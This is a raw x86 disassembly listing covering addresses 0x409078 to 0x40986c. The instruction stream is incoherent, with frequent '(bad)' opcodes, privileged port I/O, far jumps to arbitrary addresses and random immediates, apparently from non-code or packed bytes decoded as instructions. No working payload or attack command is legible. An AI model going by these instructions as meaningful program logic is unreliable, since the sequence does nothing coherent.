  409078:	fild   DWORD PTR [edx+0x1e2f67ed]
  40907e:	shr    DWORD PTR [ebx-0x7f4f25a1],0x54
  409085:	cmp    dl,BYTE PTR [edi-0x7e8b2de]
  40908b:	pop    ebx
  40908c:	pop    ebp
  40908d:	dec    ebx
  40908e:	pop    ds
  40908f:	cmp    BYTE PTR [ebp+0x2c7c87d0],0x10
  409096:	xchg   esp,eax
  409097:	cmp    BYTE PTR [edi+0x46],ch
  40909a:	ja     0x409043
  40909c:	aaa    
  40909d:	loope  0x40902e
  40909f:	cmc    
  4090a0:	jbe    0x409057
  4090a2:	repz repz fcom DWORD PTR [esi+ebx*2-0x10]
  4090a8:	aam    0x0
  4090aa:	icebp  
  4090ab:	push   cs
  4090ac:	inc    edi
  4090ad:	xor    dl,BYTE PTR [ebp+0x62]
  4090b0:	sub    BYTE PTR [esi],bl
  4090b2:	out    dx,al
  4090b3:	push   eax
  4090b4:	inc    eax
  4090b5:	mov    ds:0x736fbe1b,al
  4090ba:	jl     0x4090fd
  4090bc:	aam    0x6f
  4090be:	nop
  4090bf:	pop    eax
  4090c0:	mov    cs,WORD PTR [edx]
  4090c2:	in     al,dx
  4090c3:	xchg   ebp,eax
  4090c4:	push   ss
  4090c5:	shl    BYTE PTR [ecx-0x24],cl
  4090c8:	(bad)  
  4090c9:	aam    0xde
  4090cb:	out    dx,eax
  4090cc:	and    eax,0x8f480793
  4090d1:	and    eax,0x8984aba0
  4090d6:	nop
  4090d7:	ret    
  4090d8:	or     BYTE PTR [edx],dl
  4090da:	push   esp
  4090db:	dec    eax
  4090dc:	(bad)  
  4090dd:	cwde   
  4090de:	and    eax,0x7ae9aaaf
  4090e3:	ja     0x409132
  4090e5:	clc    
  4090e6:	imul   edx,edx,0xffffffe5
  4090e9:	add    al,0x4
  4090eb:	sbb    ecx,esp
  4090ed:	in     al,0x4e
  4090ef:	sub    ebp,DWORD PTR [eax+0x18]
  4090f2:	les    ebp,FWORD PTR [edx]
  4090f4:	xor    BYTE PTR ds:0x7b5e025e,0xf4
  4090fb:	(bad)  
  4090fd:	push   edi
  4090fe:	out    dx,al
  4090ff:	push   es
  409100:	mov    ah,0xa
  409102:	pushf  
  409103:	xchg   ebp,eax
  409104:	mov    al,ds:0x283284fc
  409109:	shr    esi,cl
  40910b:	mov    ah,0x50
  40910d:	add    cl,0x78
  409110:	data16 test dl,dl
  409113:	sbb    DWORD PTR [ecx],0xb52433d1
  409119:	call   0xee4f52bd
  40911e:	cmp    edx,DWORD PTR [ebp+0x66]
  409121:	test   al,0x8a
  409123:	jp     0x409105
  409125:	jge    0x409110
  409127:	es sub ah,dl
  40912a:	arpl   WORD PTR [edx-0x33e3beb7],cx
  409130:	cmc    
  409131:	retf   0xf476
  409134:	jmp    0x64b6c390
  409139:	mov    ebp,0x8834e966
  40913e:	scas   eax,DWORD PTR es:[edi]
  40913f:	pusha  
  409140:	xchg   edi,eax
  409141:	inc    edi
  409142:	lock and eax,DWORD PTR [edi+0x21]
  409146:	or     edx,edi
  409148:	mov    DWORD PTR [esi-0x7b7e84ba],esi
  40914e:	xor    DWORD PTR [edx],esi
  409150:	shr    cl,cl
  409152:	loopne 0x409199
  409154:	ss add al,0xe
  409157:	(bad)  
  409158:	lock cmps BYTE PTR ds:[si],BYTE PTR es:[di]
  40915b:	sti    
  40915c:	les    ebx,FWORD PTR [ebx+0x3c]
  40915f:	lods   al,BYTE PTR ds:[esi]
  409160:	jl     0x4091c8
  409162:	jle    0x409176
  409164:	fdiv   QWORD PTR ds:0x4a1ffe80
  40916a:	add    ecx,DWORD PTR [edx-0x4865e599]
  409170:	test   eax,0xbe726381
  409175:	and    ecx,edi
  409177:	pusha  
  409178:	jae    0x4091d6
  40917a:	xchg   ebp,eax
  40917b:	mov    bh,0x21
  40917d:	rol    BYTE PTR [ebx-0x5992f329],cl
  409183:	cs mov ecx,0x4e59e412
  409189:	shl    DWORD PTR [edx-0x66e19762],cl
  40918f:	mov    ah,0x44
  409191:	scas   al,BYTE PTR es:[di]
  409193:	rcr    DWORD PTR [edx-0x18],0xb7
  409197:	out    0x19,al
  409199:	aas    
  40919a:	push   ecx
  40919b:	mov    dl,0xa5
  40919d:	sbb    DWORD PTR [ecx],esp
  40919f:	daa    
  4091a0:	or     ebx,ecx
  4091a2:	fsave  [esi+edx*2-0x72]
  4091a7:	pusha  
  4091a8:	repz loopne 0x409177
  4091ab:	int3   
  4091ac:	xlat   BYTE PTR ds:[ebx]
  4091ad:	jmp    0x4091e7
  4091af:	mov    esp,ebx
  4091b1:	push   ds
  4091b2:	mov    ch,BYTE PTR [edi-0x5]
  4091b5:	lods   al,BYTE PTR ds:[esi]
  4091b6:	loopne 0x409213
  4091b8:	push   edx
  4091b9:	rcl    BYTE PTR [ecx+0x7f],cl
  4091bc:	jb     0x4091cc
  4091be:	mov    dl,0xe
  4091c0:	mov    cl,0x66
  4091c2:	pop    ebp
  4091c3:	int    0x52
  4091c5:	int3   
  4091c6:	enter  0x2100,0xc7
  4091ca:	sti    
  4091cb:	and    bl,BYTE PTR [ebx+0x38db426e]
  4091d1:	xchg   DWORD PTR [esi-0x333a7227],edi
  4091d7:	sar    DWORD PTR [ecx],1
  4091d9:	push   ecx
  4091da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091db:	imul   esp,DWORD PTR [ebp+edi*1+0x7],0x4d87cf49
  4091e3:	and    edi,0x2169e60a
  4091e9:	xchg   BYTE PTR ds:0x5b83570,dl
  4091ef:	cmp    ah,BYTE PTR [edi-0x5a]
  4091f2:	mov    al,gs:0x4c0a868e
  4091f8:	xchg   ebx,eax
  4091f9:	dec    esi
  4091fa:	jle    0x409196
  4091fc:	cs icebp 
  4091fe:	retf   
  4091ff:	mov    ch,0x9
  409201:	add    eax,0x44a2cf69
  409206:	jo     0x40922d
  409208:	adc    ebp,edi
  40920a:	sub    BYTE PTR gs:[ebp+0x5c76eb9b],bl
  409211:	pop    eax
  409212:	fisubr DWORD PTR [ebx+0x69]
  409215:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409216:	shl    DWORD PTR [ebx+0x5a220162],cl
  40921c:	jno    0x409299
  40921e:	lods   al,BYTE PTR ds:[esi]
  40921f:	mov    ch,bh
  409221:	lods   al,BYTE PTR ds:[esi]
  409222:	dec    ebx
  409223:	mov    eax,0x8cfb59f8
  409228:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409229:	pop    ebp
  40922a:	inc    ecx
  40922b:	xor    esp,DWORD PTR [ecx-0x7e]
  40922e:	pushf  
  40922f:	xor    al,0x93
  409231:	pop    eax
  409232:	(bad)  
  409233:	ss and BYTE PTR cs:[esi+0x46],dl
  409238:	icebp  
  409239:	aam    0x7d
  40923b:	mov    edi,DWORD PTR [edx-0x279ad0dd]
  409241:	adc    al,0x21
  409243:	sub    al,0xd5
  409245:	mov    ecx,0xbf896a59
  40924a:	test   al,0x1e
  40924c:	or     eax,0xcd350de1
  409251:	fbstp  TBYTE PTR [ebp+0x38]
  409254:	mov    gs,WORD PTR [edi+0x344f7630]
  40925a:	or     DWORD PTR [eax-0x26],edx
  40925d:	mov    eax,ds:0xf2eafc3
  409262:	sar    BYTE PTR [esi+edi*8+0x54],cl
  409266:	push   0x4e
  409268:	jns    0x4092ae
  40926a:	mov    es,WORD PTR [ecx+eiz*2]
  40926d:	daa    
  40926e:	loopne 0x40920c
  409270:	push   ebx
  409271:	stc    
  409272:	int    0x4a
  409274:	mov    bl,0x3
  409276:	les    esi,FWORD PTR [ecx-0x7533e254]
  40927c:	pop    ds
  40927d:	mov    esi,?
  40927f:	push   0x18
  409281:	fmul   QWORD PTR [edi]
  409283:	sbb    bl,al
  409285:	and    eax,0x73c3f73a
  40928a:	adc    eax,0x1b0eee39
  40928f:	addr16 pusha 
  409291:	sbb    BYTE PTR [edx+0x77],ah
  409294:	add    DWORD PTR [edx-0x4b],edx
  409297:	cld    
  409298:	call   0x304c3e04
  40929d:	int3   
  40929e:	jb     0x4092cf
  4092a0:	inc    ecx
  4092a1:	into   
  4092a2:	push   ss
  4092a3:	test   edi,0x1f3d9d1d
  4092a9:	sbb    eax,0x5c0ce739
  4092ae:	push   ss
  4092af:	scas   eax,DWORD PTR es:[edi]
  4092b0:	xchg   ebp,eax
  4092b1:	call   0xe79f:0xff0ae8e7
  4092b8:	repz mov ds:0xdec6bc63,eax
  4092be:	cmp    DWORD PTR [ebp+0xd59f19d],eax
  4092c4:	test   ah,ch
  4092c6:	jae    0x4092c0
  4092c8:	cs jne 0x4092fc
  4092cb:	mov    ds:0xb0b6c2e0,eax
  4092d0:	mov    eax,ds:0x50e336e8
  4092d5:	gs lahf 
  4092d7:	mov    eax,0x67aa0077
  4092dc:	inc    edx
  4092dd:	(bad)  
  4092de:	cmp    eax,0xc567a2b5
  4092e3:	clc    
  4092e4:	push   edx
  4092e5:	scas   al,BYTE PTR es:[edi]
  4092e6:	ror    BYTE PTR [ebp+0x6b],0xc8
  4092ea:	and    ebx,edi
  4092ec:	aaa    
  4092ed:	mov    ah,0x23
  4092ef:	push   ss
  4092f0:	cmp    DWORD PTR [edx-0x2115e1c],edi
  4092f6:	sub    al,0x98
  4092f8:	in     al,dx
  4092f9:	cmp    DWORD PTR [eax],ecx
  4092fb:	push   es
  4092fc:	push   edi
  4092fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092fe:	xor    al,dh
  409300:	inc    edi
  409301:	xchg   ecx,eax
  409302:	std    
  409303:	inc    ebx
  409304:	inc    esp
  409305:	pop    es
  409306:	lds    esi,FWORD PTR [ebp-0x7e]
  409309:	mov    ds:0x15b908a7,eax
  40930e:	or     edi,DWORD PTR [esi]
  409310:	add    BYTE PTR [ecx+0x60],bh
  409313:	mov    ds:0x55353e97,al
  409318:	xor    BYTE PTR [eax-0x6c],ch
  40931b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40931c:	hlt    
  40931d:	add    bh,BYTE PTR [eax-0x3db7e72b]
  409323:	pop    es
  409324:	(bad)  ds:0x406ff324
  40932a:	push   edi
  40932b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40932c:	loope  0x4092ba
  40932e:	out    0x6c,eax
  409330:	mov    edi,0xc395f37e
  409335:	mov    bl,BYTE PTR [edi-0x637ddf48]
  40933b:	jno    0x4092fb
  40933d:	mov    al,ds:0xbe6190c1
  409342:	cs mov bl,0x3d
  409345:	fs scas eax,DWORD PTR es:[edi]
  409347:	lea    edi,[ebx]
  409349:	sbb    eax,0xb21e1a09
  40934e:	sub    esp,DWORD PTR [ebp-0x72cdc7ac]
  409354:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409355:	push   ebp
  409356:	fcmove st,st(4)
  409358:	adc    ebp,DWORD PTR [esi]
  40935a:	lds    ebx,FWORD PTR [ebp+0x2ab2c02a]
  409360:	jl     0x409321
  409362:	sub    DWORD PTR [edx],edi
  409364:	in     al,0xc3
  409366:	dec    edi
  409367:	mov    bh,0xb
  409369:	xor    dh,ah
  40936b:	loop   0x4092ef
  40936d:	enter  0x4f83,0x3
  409371:	mov    ebx,0x388d4612
  409376:	in     al,dx
  409377:	and    bl,BYTE PTR [eax]
  409379:	pop    ecx
  40937a:	sbb    bl,BYTE PTR [eax-0x318dc25]
  409380:	sbb    DWORD PTR [edi-0x23],esp
  409383:	xor    edx,DWORD PTR [eax+0x15]
  409386:	fs dec ebp
  409388:	fldcw  WORD PTR [edi+0x293278bb]
  40938e:	ret    0x748
  409391:	pop    es
  409392:	xchg   esp,eax
  409393:	icebp  
  409394:	pop    ebp
  409395:	sbb    DWORD PTR [esi+0x14190503],0xffffffa9
  40939c:	scas   eax,DWORD PTR es:[edi]
  40939d:	js     0x40941e
  40939f:	imul   eax,DWORD PTR [edi+ebp*1+0x21],0x2bfd2fee
  4093a7:	sbb    BYTE PTR [ebx+0x76],0x22
  4093ab:	aas    
  4093ac:	sahf   
  4093ad:	iret   
  4093ae:	imul   eax,DWORD PTR [ebx+ebx*8-0x60],0x7e
  4093b3:	fwait
  4093b4:	into   
  4093b5:	bound  eax,QWORD PTR [ebp-0x121b2ea8]
  4093bb:	dec    ebx
  4093bc:	fnsave [ecx+0x6f]
  4093bf:	icebp  
  4093c0:	test   eax,0xb077c9a7
  4093c5:	hlt    
  4093c6:	jl     0x4093b8
  4093c8:	lock xchg DWORD PTR [ebx+0x2f],edi
  4093cc:	cmp    eax,0xe22958a6
  4093d1:	fmul   st(4),st
  4093d3:	ficomp WORD PTR [ebx-0x266abd88]
  4093d9:	and    ebx,ecx
  4093db:	test   DWORD PTR [eax-0x3a],esp
  4093de:	cwde   
  4093df:	call   0x8ee4:0x5e9745d0
  4093e6:	into   
  4093e7:	and    eax,0xf3ecb79e
  4093ec:	push   ebp
  4093ed:	jmp    0xb40c0330
  4093f2:	sub    DWORD PTR [ebx-0x67],ecx
  4093f5:	sub    al,0xa8
  4093f7:	pop    ss
  4093f8:	fldcw  WORD PTR [esi+0x67]
  4093fb:	ins    BYTE PTR es:[edi],dx
  4093fc:	das    
  4093fd:	outs   dx,BYTE PTR ds:[esi]
  4093fe:	ds fadd st(6),st
  409401:	sbb    DWORD PTR [eax+ebp*2+0x59],esp
  409405:	in     al,dx
  409406:	rol    BYTE PTR [esi],0xd9
  409409:	cld    
  40940a:	xor    BYTE PTR [ebx],bl
  40940c:	mov    dl,0x6e
  40940e:	ins    BYTE PTR es:[edi],dx
  40940f:	sti    
  409410:	retf   
  409411:	push   edx
  409412:	rol    edx,cl
  409414:	ss je  0x4093e6
  409417:	lds    eax,FWORD PTR [eax-0x510783d7]
  40941d:	pop    edx
  40941e:	xchg   DWORD PTR [eax],esp
  409420:	adc    esi,DWORD PTR ds:0x27dbf84f
  409426:	mov    BYTE PTR [eax-0x4b],bl
  409429:	adc    ch,BYTE PTR [eax-0x5a8938ea]
  40942f:	arpl   sp,si
  409431:	cdq    
  409432:	nop
  409433:	pop    edx
  409434:	or     BYTE PTR [eax],dh
  409436:	(bad)  
  409437:	mov    cl,0x5
  409439:	jge    0x409407
  40943b:	cmp    DWORD PTR ds:0xe2e12de4,0x907eb55d
  409445:	dec    edi
  409446:	or     eax,0x3780d07f
  40944b:	adc    al,0x0
  40944d:	or     DWORD PTR [ebx-0x36f99769],esp
  409453:	push   ebp
  409454:	adc    al,0xd3
  409456:	and    eax,0x356432d0
  40945b:	sub    al,0x84
  40945d:	jl     0x4094a3
  40945f:	ror    DWORD PTR [esi-0x76e0eef2],0xa1
  409466:	arpl   WORD PTR [edi+0x6fb2caa9],di
  40946c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40946d:	sbb    eax,0xeafad80a
  409472:	es jle 0x40942d
  409475:	dec    ecx
  409476:	stos   BYTE PTR es:[edi],al
  409477:	mov    cl,0xfa
  409479:	data16 jb 0x4094df
  40947c:	dec    edx
  40947d:	ret    
  40947e:	dec    esp
  40947f:	jne    0x4094bb
  409481:	(bad)
  409484:	pop    ecx
  409485:	xor    ecx,DWORD PTR [esi]
  409487:	retf   
  409488:	and    bh,bh
  40948a:	adc    esp,esi
  40948c:	mov    dh,0x47
  40948e:	int    0xab
  409490:	push   esp
  409491:	jecxz  0x409473
  409493:	push   ebp
  409494:	or     eax,0x59fa868c
  409499:	stos   BYTE PTR es:[edi],al
  40949a:	rcl    BYTE PTR [esi+0x50],1
  40949d:	sahf   
  40949e:	push   cs
  40949f:	push   ss
  4094a0:	sub    al,BYTE PTR [ebp+0x7]
  4094a3:	inc    BYTE PTR [ecx]
  4094a5:	(bad)  
  4094a6:	or     DWORD PTR [esi+0x66],ebx
  4094a9:	add    esi,edi
  4094ab:	les    esp,FWORD PTR ds:0x49203162
  4094b1:	xchg   BYTE PTR [ebx-0x21ab3cf],bh
  4094b7:	mov    DWORD PTR [edx+0x4f406f4c],0x3e0308c7
  4094c1:	add    ebp,DWORD PTR [ecx-0x75]
  4094c4:	jp     0x4094c0
  4094c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094c7:	mov    ebx,0x98e32335
  4094cc:	stos   BYTE PTR es:[edi],al
  4094cd:	loop   0x40950d
  4094cf:	dec    ecx
  4094d0:	and    eax,0xcefa6f1a
  4094d5:	outs   dx,BYTE PTR ds:[esi]
  4094d6:	into   
  4094d7:	sti    
  4094d8:	mov    eax,0xcdb89431
  4094dd:	daa    
  4094de:	inc    eax
  4094df:	scas   al,BYTE PTR es:[edi]
  4094e0:	js     0x409472
  4094e2:	in     al,0xea
  4094e4:	xlat   BYTE PTR ds:[bx]
  4094e6:	and    edi,0xffffffa7
  4094e9:	cmp    bh,al
  4094eb:	or     BYTE PTR [ebp-0x430d0f9e],ah
  4094f1:	mov    eax,ds:0x6006ec47
  4094f6:	cld    
  4094f7:	mov    ecx,DWORD PTR [ebx]
  4094f9:	fwait
  4094fa:	scas   eax,DWORD PTR es:[edi]
  4094fb:	jnp    0x4094aa
  4094fd:	jecxz  0x40957c
  4094ff:	aaa    
  409500:	cvttps2pi mm2,QWORD PTR [ebp+0xccee169]
  409507:	lods   al,BYTE PTR ds:[esi]
  409508:	jle    0x4094ca
  40950a:	xchg   BYTE PTR [ebx],cl
  40950c:	jmp    0x8f4b:0xb8027c1a
  409513:	pop    ss
  409514:	popf   
  409515:	push   ebp
  409516:	test   DWORD PTR [eax+0x3d76bfba],esi
  40951c:	pop    edx
  40951d:	jnp    0x40950f
  40951f:	(bad)  
  409520:	jmp    0x95842dae
  409525:	or     al,0x1f
  409527:	cmp    eax,edi
  409529:	sub    ch,ch
  40952b:	rol    DWORD PTR ds:0x5c86a403,1
  409531:	pop    esp
  409532:	mov    ds:0xf94ec265,eax
  409537:	jl     0x409551
  409539:	mov    dh,0xe8
  40953b:	in     eax,dx
  40953c:	inc    ecx
  40953d:	hlt    
  40953e:	jge    0x409555
  409540:	inc    ebp
  409541:	cld    
  409542:	cwde   
  409543:	pop    eax
  409544:	adc    DWORD PTR ds:0x5bd385ca,esp
  40954a:	and    DWORD PTR [eax-0x7f6b2a88],esi
  409550:	xchg   cl,cl
  409552:	mov    ch,0x30
  409554:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409555:	retf   0xe1dc
  409558:	or     al,0x3
  40955a:	(bad)  
  40955b:	adc    esi,DWORD PTR [ebx+0x5cc5d522]
  409561:	add    DWORD PTR [eax+0x3d],ecx
  409564:	xchg   dh,ah
  409566:	sti    
  409567:	(bad)  
  409569:	ins    DWORD PTR es:[edi],dx
  40956a:	adc    BYTE PTR [edx+0x794b15d4],ch
  409570:	inc    esi
  409571:	jmp    0x409558
  409573:	iret   
  409574:	frstor [edi+0x6da86f6a]
  40957a:	push   ds
  40957b:	mov    ds:0xda2ae1fa,eax
  409580:	sub    dh,BYTE PTR [edx]
  409582:	push   0x57
  409584:	test   eax,0xd2872b62
  409589:	cdq    
  40958a:	xor    al,0x48
  40958c:	mov    fs,WORD PTR [ebp+0x3d5a4d]
  409592:	xor    DWORD PTR [ebx],0x56
  409595:	stc    
  409596:	(bad)  
  409597:	xor    al,0x7d
  409599:	and    al,BYTE PTR [edx-0x36]
  40959c:	adc    ebp,ebp
  40959e:	mov    ebx,0xf041b700
  4095a3:	out    dx,al
  4095a4:	ins    BYTE PTR es:[edi],dx
  4095a5:	cmp    ebx,ebx
  4095a7:	inc    edx
  4095a8:	mov    bh,0x96
  4095aa:	jo     0x40959d
  4095ac:	sbb    ebx,DWORD PTR [ebp+ebx*2+0x157ee1f6]
  4095b3:	mov    gs,WORD PTR [ebx]
  4095b5:	push   0xffffff9a
  4095b7:	inc    ecx
  4095b8:	cs pop esi
  4095ba:	or     ch,BYTE PTR [ecx+0x6e23ade7]
  4095c0:	jnp    0x4095fe
  4095c2:	mov    esp,0x7a4b6219
  4095c7:	push   esp
  4095c8:	ret    
  4095c9:	lahf   
  4095ca:	cmp    BYTE PTR [esi],cl
  4095cc:	pushf  
  4095cd:	xor    ebx,ebx
  4095cf:	push   eax
  4095d0:	jns    0x409617
  4095d2:	out    dx,eax
  4095d3:	mov    ds:0x3578b151,eax
  4095d8:	fstp   QWORD PTR [eax]
  4095da:	xchg   ebp,eax
  4095db:	lods   eax,DWORD PTR ds:[esi]
  4095dc:	nop
  4095dd:	push   ss
  4095de:	neg    DWORD PTR [ebp+0xf]
  4095e1:	ret    
  4095e2:	lods   eax,DWORD PTR ds:[esi]
  4095e3:	test   DWORD PTR [ecx+0x2a8377ee],0xcbeb0593
  4095ed:	or     DWORD PTR [ecx],0x4f056abe
  4095f3:	add    DWORD PTR [ecx],ebx
  4095f5:	fdiv   QWORD PTR [esi]
  4095f7:	pop    eax
  4095f8:	leave  
  4095f9:	ins    DWORD PTR es:[edi],dx
  4095fa:	xchg   esi,eax
  4095fb:	sbb    al,BYTE PTR [eax+edi*2-0x80]
  4095ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409600:	jp     0x409659
  409602:	test   DWORD PTR [edi+0x216a5b26],ebx
  409608:	ror    BYTE PTR [edx+0x4f5b6278],1
  40960e:	bound  eax,QWORD PTR [edi]
  409610:	in     eax,dx
  409611:	add    cl,BYTE PTR [edx+0x4702212d]
  409617:	xor    al,0x1a
  409619:	retf   0x3c96
  40961c:	push   ebx
  40961d:	(bad)  
  40961e:	aam    0xb3
  409620:	inc    esi
  409621:	mov    esi,0x8ae0e881
  409626:	dec    esp
  409627:	add    DWORD PTR [ebp+0x6c],0xff163cca
  40962e:	lods   eax,DWORD PTR ds:[esi]
  40962f:	xchg   edx,eax
  409630:	jmp    0xc1f2a3e0
  409635:	sbb    dl,dh
  409637:	dec    ebp
  409638:	sub    esi,DWORD PTR [edi]
  40963a:	loop   0x409683
  40963c:	dec    ebp
  40963d:	out    dx,eax
  40963e:	jnp    0x4095f6
  409640:	sbb    BYTE PTR [eax-0x56],bl
  409643:	arpl   WORD PTR ds:0xf4945f20,cx
  40964a:	sbb    ecx,DWORD PTR [ebx-0x2c539dbc]
  409650:	popf   
  409651:	pop    eax
  409652:	pop    eax
  409653:	jmp    0x72b6f7df
  409658:	xchg   edx,eax
  409659:	aaa    
  40965a:	call   0x2e49ae7f
  40965f:	push   ss
  409660:	or     al,BYTE PTR [esi+edi*8]
  409663:	loop   0x409652
  409665:	jmp    0x4096e4
  409667:	mov    al,ds:0xb41d4ae6
  40966c:	shr    BYTE PTR [edx+0x420e7137],1
  409672:	scas   eax,DWORD PTR es:[edi]
  409673:	ss aam 0xfb
  409676:	inc    ecx
  409677:	idiv   BYTE PTR [edx+0x4b]
  40967a:	add    al,0x48
  40967c:	and    ah,0x71
  40967f:	jb     0x40969a
  409681:	aad    0xd
  409683:	cld    
  409684:	jo     0x40966d
  409686:	inc    ebp
  409687:	les    eax,FWORD PTR [ebx]
  409689:	retf   0xcb76
  40968c:	mov    ecx,0xc67a0ec
  409691:	inc    ebx
  409692:	rol    DWORD PTR [ecx+0x55efa722],cl
  409698:	mov    al,ds:0x6a9f116a
  40969d:	aaa    
  40969e:	pushf  
  40969f:	pop    eax
  4096a0:	mov    ds:0xfc9d3e4e,eax
  4096a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096a6:	pop    ebx
  4096a7:	jl     0x409708
  4096a9:	xchg   edi,eax
  4096aa:	test   eax,0x898498a7
  4096af:	das    
  4096b0:	and    eax,0xa2a6babb
  4096b5:	push   0xe1ef145c
  4096ba:	shl    BYTE PTR ds:[ecx],cl
  4096bd:	dec    esp
  4096be:	dec    esp
  4096bf:	sbb    ah,ch
  4096c1:	rcr    BYTE PTR [eax+eax*2+0x7fae059b],0xbe
  4096c9:	xor    DWORD PTR [ecx-0x4ad6e750],ebx
  4096cf:	mov    edx,0xd2411f9c
  4096d4:	js     0x409700
  4096d6:	pusha  
  4096d7:	aas    
  4096d8:	xor    BYTE PTR [edx-0x71b8af1a],bl
  4096de:	call   0xddd492e5
  4096e3:	push   eax
  4096e4:	mov    BYTE PTR [ecx],bl
  4096e6:	push   ebp
  4096e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096e8:	lods   al,BYTE PTR ds:[esi]
  4096e9:	mov    esp,0xe9b87641
  4096ee:	cs pop ebx
  4096f0:	stos   BYTE PTR es:[edi],al
  4096f1:	int3   
  4096f2:	add    eax,0xcaab5075
  4096f7:	sbb    eax,0xeb415444
  4096fc:	jmp    0x7ceb:0x5fa66a4f
  409703:	xchg   esi,eax
  409704:	ds dec esp
  409706:	push   es
  409707:	pop    esi
  409708:	out    dx,eax
  409709:	pop    edi
  40970a:	lds    ebx,FWORD PTR [eax]
  40970c:	imul   ebx,DWORD PTR [edi-0x355c834c],0xb143c430
  409716:	aas    
  409717:	ficom  WORD PTR [eax+0x29c21c1b]
  40971d:	ret    
  40971e:	cld    
  40971f:	fucom  st(4)
  409721:	loope  0x40970e
  409723:	inc    ebp
  409724:	data16 hlt 
  409726:	mov    ds:0xcb10f358,eax
  40972b:	pusha  
  40972c:	inc    ebp
  40972d:	sub    BYTE PTR [ecx],bh
  40972f:	dec    ebp
  409730:	out    dx,eax
  409731:	and    al,0x72
  409733:	mov    DWORD PTR [eax],edi
  409735:	add    DWORD PTR [ebx-0x6b6f559f],edi
  40973b:	jle    0x4097b1
  40973d:	inc    eax
  40973e:	retf   
  40973f:	(bad)  
  409740:	popa   
  409741:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409742:	cmc    
  409743:	or     esi,DWORD PTR ds:0x9a1bd0d7
  409749:	arpl   WORD PTR [edx+0x214a91e6],ax
  40974f:	jns    0x40972c
  409751:	and    BYTE PTR [ebp+0x656ac842],al
  409757:	popf   
  409758:	dec    ecx
  409759:	fcom   QWORD PTR [eax+0x1a]
  40975c:	out    0x30,al
  40975e:	sbb    al,0x17
  409760:	add    dl,BYTE PTR [ebp-0x7ad618f5]
  409766:	xor    DWORD PTR [esi+0xdead664],ebp
  40976c:	sahf   
  40976d:	cld    
  40976e:	(bad)  
  40976f:	mov    al,0x97
  409771:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409772:	mov    ds:0x7dbd3dd5,eax
  409777:	call   FWORD PTR [ebp+edi*8-0x14873711]
  40977e:	fxam   
  409780:	sub    BYTE PTR [edi+0x69531995],bh
  409786:	jmp    0x47ed4d20
  40978b:	test   DWORD PTR [edi],ecx
  40978d:	push   ds
  40978e:	addr16 push ss
  409790:	repnz (bad) 
  409792:	repz cld 
  409794:	inc    esp
  409795:	mov    ecx,0x2e0f3a3c
  40979a:	adc    al,0xeb
  40979c:	test   al,0xdb
  40979e:	mov    dl,0x39
  4097a0:	unpcklps xmm3,xmm1
  4097a3:	hlt    
  4097a4:	cmp    DWORD PTR [esi-0x2a9ad7fb],esp
  4097aa:	retf   0xe46d
  4097ad:	aam    0x6a
  4097af:	sub    cl,BYTE PTR [esi]
  4097b1:	jo     0x409785
  4097b3:	sub    al,0xa8
  4097b5:	aaa    
  4097b6:	outs   dx,BYTE PTR ds:[esi]
  4097b7:	leave  
  4097b8:	stos   BYTE PTR es:[edi],al
  4097b9:	inc    edi
  4097ba:	(bad)  
  4097bc:	add    esi,DWORD PTR [eax-0x513e7843]
  4097c2:	not    BYTE PTR [edi+0x6e]
  4097c5:	jge    0x409832
  4097c7:	mov    edx,0xf16ee7f8
  4097cc:	jb     0x409803
  4097ce:	aad    0x72
  4097d0:	fisubr DWORD PTR [edx-0x2391fe5e]
  4097d6:	xor    DWORD PTR [ebp-0x51],eax
  4097d9:	push   cs
  4097da:	sbb    edi,DWORD PTR [esi]
  4097dc:	dec    ecx
  4097dd:	and    BYTE PTR [ecx],bl
  4097df:	add    eax,0x103faae
  4097e4:	gs leave 
  4097e6:	ret    
  4097e7:	inc    edx
  4097e8:	adc    DWORD PTR [edi],edi
  4097ea:	les    edx,FWORD PTR [edx-0x62]
  4097ed:	dec    ecx
  4097ee:	leave  
  4097ef:	shl    DWORD PTR [edi+ebx*1-0x36],cl
  4097f3:	out    dx,al
  4097f4:	push   edi
  4097f5:	idiv   DWORD PTR [edi-0x18a9df8a]
  4097fb:	outs   dx,DWORD PTR ds:[esi]
  4097fc:	adc    BYTE PTR ds:0x5247f76,ah
  409802:	mov    dh,0x56
  409804:	adc    ebx,DWORD PTR [ebx]
  409806:	lock adc DWORD PTR [ebx+0x7b903fff],0xffffff8b
  40980e:	es jb  0x4097a4
  409811:	adc    esi,DWORD PTR [eax]
  409813:	or     al,0x96
  409815:	xchg   esi,eax
  409816:	add    eax,0x5a70fa0f
  40981b:	loope  0x40979d
  40981d:	scas   eax,DWORD PTR es:[edi]
  40981e:	cmp    ebp,esp
  409820:	jp     0x40988a
  409822:	out    0xbf,al
  409824:	iret   
  409825:	mov    bl,0xf3
  409827:	sti    
  409828:	jo     0x40984a
  40982a:	sub    eax,DWORD PTR [eax]
  40982c:	test   eax,0x943d9e19
  409831:	sbb    al,0x1
  409833:	outs   dx,BYTE PTR ds:[esi]
  409834:	lods   eax,DWORD PTR ds:[esi]
  409835:	push   es
  409836:	imul   edx,DWORD PTR [esi+0x6d61e1cd],0x71
  40983d:	shr    BYTE PTR [ecx-0x5075a4b1],cl
  409843:	mov    WORD PTR [eax+0x4a875c13],?
  409849:	fs xor al,0x27
  40984c:	lea    eax,[edi-0x52ba413d]
  409852:	(bad)  
  409853:	pop    esi
  409854:	sub    cl,BYTE PTR [esi+0x5bff17b2]
  40985a:	jmp    0x409837
  40985c:	out    0xb,al
  40985e:	or     BYTE PTR [edx-0x64950651],bl
  409864:	xor    al,0x5f
  409866:	xchg   edi,eax
  409867:	inc    ebx
  409868:	jge    0x4097f4
  40986a:	jle    0x409848
  40986c:	or     edx,edx
